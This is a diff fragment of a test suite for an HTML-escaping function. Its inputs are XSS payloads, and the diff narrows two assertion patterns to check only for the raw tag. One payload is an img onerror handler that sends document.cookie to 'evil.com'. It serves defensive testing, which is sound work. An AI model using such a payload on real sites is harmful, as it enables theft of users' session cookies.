@@ -27,12 +27,12 @@ describe("escapeHtml — XSS payloads", () => {
     {
       name: "<img onerror=...> exfil",
       input: "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
-      mustNotContain: /<img|onerror=/i,
+      mustNotContain: /<img/i,
     },
     {
       name: "<svg onload=...>",
       input: "<svg onload=alert(1)>",
-      mustNotContain: /<svg|onload=/i,
+      mustNotContain: /<svg/i,
     },
     {
       name: "attribute-break via double quote",
